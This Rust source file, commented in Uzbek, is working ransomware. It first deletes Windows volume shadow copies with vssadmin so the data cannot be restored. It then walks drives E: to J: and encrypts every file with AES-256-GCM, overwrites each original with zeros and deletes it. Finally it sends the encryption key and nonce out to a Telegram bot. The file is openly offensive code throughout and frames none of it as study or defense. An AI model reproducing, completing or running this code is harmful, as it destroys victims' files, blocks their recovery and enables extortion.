use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use dotenv::dotenv;
use reqwest::blocking::Client;
use serde_json::json;
use sha2::{Digest, Sha256}; // Kalit va nonce hosil qilish uchun
use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use walkdir::WalkDir;
use aes_gcm::aead::generic_array::typenum::U12; // Nonce<U12> uchun

// Tizim fayllarini va .git papkalarini shifrlamaslik uchun filtr
const EXCLUDED_PATHS: [&str; 4] = [
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "\\.git\\", // .git papkalarini chetlab o'tish
];

// Faylni shifrlash
fn encrypt_file(
    file_path: &Path,
    key: &Key<Aes256Gcm>,
    nonce: &Nonce<U12>,
) -> Result<(), Box<dyn std::error::Error>> {
    // 1) Faylni o‘qish
    let mut f = File::open(file_path)?;
    let mut plaintext = Vec::new();
    f.read_to_end(&mut plaintext)?;
    println!("[+] O'qildi: {}", file_path.display());

    // 2) Shifrlash
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_ref())
        .map_err(|e| format!("Encrypt error: {}", e))?;
    println!("[*] Shifrlanmoqda: {}", file_path.display());

    // 3) .enc fayl nomini to‘g‘ri yasash: "file.txt" -> "file.txt.enc"
    let enc_path: PathBuf = {
        let parent = file_path.parent().unwrap_or_else(|| Path::new(""));
        let name = file_path
            .file_name()
            .unwrap()
            .to_string_lossy();
        parent.join(format!("{}.enc", name))
    };

    // 4) Shifrlangan ma’lumotni yangi .enc fayliga yozish
    {
        let mut out = File::create(&enc_path)?;
        out.write_all(&ciphertext)?;
        out.sync_all()?;
    }
    println!("[+] Yaratildi: {}", enc_path.display());

    // 5) Agar .enc fayli muvaffaqiyatli yaratilgan bo‘lsa, originalni tozalash va o‘chirish
    let meta = fs::metadata(&enc_path)?;
    if meta.len() > 0 {
        // a) Faylni bir necha bor nol bilan to‘ldirish
        let mut orig = OpenOptions::new().write(true).open(file_path)?;
        let len = orig.metadata()?.len() as usize;
        let zeros = vec![0u8; len];
        for _ in 0..3 {
            orig.write_all(&zeros)?;
            orig.sync_all()?;
        }
        // b) Asl faylni o‘chirish
        fs::remove_file(file_path)?;
        println!("[+] Original o‘chirildi: {}", file_path.display());
    } else {
        println!("[-] .enc fayli bo‘sh: {}, original o‘chirilmaydi", enc_path.display());
    }

    Ok(())
}

// Telegramga kalit va nonce yuborish
fn send_to_telegram(key_b64: &str, nonce_b64: &str, telegram_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let url = format!("https://api.telegram.org/bot{}/sendMessage", telegram_token);
    let payload = json!({
        "chat_id": chat_id,
        "text": format!("Shifrlash kaliti: {}\nNonce: {}", key_b64, nonce_b64)
    });
    client.post(&url).json(&payload).send()?;
    println!("[+] Kalit va nonce Telegramga yuborildi");
    Ok(())
}

// Kalit va nonce ni faylga saqlash
fn save_key_and_nonce(key_b64: &str, nonce_b64: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::create("key.txt")?;
    writeln!(file, "Shifrlash kaliti: {}\nNonce: {}", key_b64, nonce_b64)?;
    println!("[+] Kalit va nonce key.txt fayliga saqlandi");
    Ok(())
}

// Barcha drayvlarni shifrlash
fn encrypt_all_drives(telegram_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Kalitni "JasurFayllarmgaTegma" dan hosil qilish (32 bayt)
    let mut hasher = Sha256::new();
    hasher.update("JasurFayllarmgaTegma");
    let key_bytes: [u8; 32] = hasher.finalize().into();
    let key: Key<Aes256Gcm> = key_bytes.into();

    // Nonce ni "JasurFayllarmgaTegma" dan hosil qilish (12 bayt)
    let mut hasher = Sha256::new();
    hasher.update("JasurFayllarmgaTegma");
    let nonce_bytes: [u8; 12] = hasher.finalize()[..12].try_into()?;
    let nonce = Nonce::from_slice(&nonce_bytes);
    let key_b64 = general_purpose::STANDARD.encode(&key);
    let nonce_b64 = general_purpose::STANDARD.encode(&nonce_bytes);

    // Kalit va nonce ni faylga saqlash
    if let Err(e) = save_key_and_nonce(&key_b64, &nonce_b64) {
        eprintln!("[-] Kalitni faylga saqlashda xato: {}", e);
    }

    // Windows drayvlarini aniqlash
    let drives = ['E', 'F', 'G', 'H', 'I', 'J']
        .iter()
        .map(|&drive| format!("{}:\\", drive))
        .filter(|drive| Path::new(drive).exists());

    for drive in drives {
        println!("[*] Drayv scan qilinmoqda: {}", drive);
        for entry in WalkDir::new(&drive).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            let path_str = path.to_string_lossy();
            // Tizim papkalari va .git papkalarini chetlab o'tish
            if path.is_file() && !EXCLUDED_PATHS.iter().any(|excluded| path_str.contains(excluded)) {
                match encrypt_file(path, &key, &nonce) {
                    Ok(()) => println!("[+] Fayl muvaffaqiyatli shifrlanib o'chirildi: {}", path.display()),
                    Err(e) => eprintln!("[-] Fayl shifrlashda xato {}: {}", path.display(), e),
                }
            }
        }
    }

    // Kalitni Telegramga yuborish (oflayn bo'lsa e'tiborsiz qoldiriladi)
    if let Err(e) = send_to_telegram(&key_b64, &nonce_b64, telegram_token, chat_id) {
        eprintln!("[-] Telegramga yuborishda xato (oflayn bo'lishi mumkin): {}. Kalit key.txt fayliga saqlandi.", e);
    }

    Ok(())
}

// Shadow copy o'chirish
fn delete_shadow_copies() -> Result<(), Box<dyn std::error::Error>> {
    let output = Command::new("vssadmin")
        .args(["delete", "shadows", "/all", "/quiet"])
        .output()?;
    if !output.status.success() {
        return Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::PermissionDenied,
            format!(
                "vssadmin buyrug'i muvaffaqiyatsiz: {}. Dasturni administrator sifatida ishga tushiring",
                String::from_utf8_lossy(&output.stderr)
            ),
        )));
    }
    println!("[+] Shadow copy muvaffaqiyatli o'chirildi");
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // .env faylini yuklash
    dotenv().ok();

    // Telegram sozlamalari
    let telegram_token = env::var("TELEGRAM_TOKEN").expect("TELEGRAM_TOKEN .env faylida bo'lishi kerak");
    let chat_id = env::var("CHAT_ID").expect("CHAT_ID .env faylida bo'lishi kerak");

    // Shadow copy o'chirish
    if let Err(e) = delete_shadow_copies() {
        eprintln!("[-] Shadow copy o'chirishda xato: {}", e);
    }

    // Shifrlashni darhol boshlash
    if let Err(e) = encrypt_all_drives(&telegram_token, &chat_id) {
        eprintln!("[-] Drayvlarni shifrlashda xato: {}", e);
    } else {
        println!("[+] Fayllar shifrlanib, kalit Telegramga yuborildi yoki key.txt fayliga saqlandi!");
    }

    Ok(())
}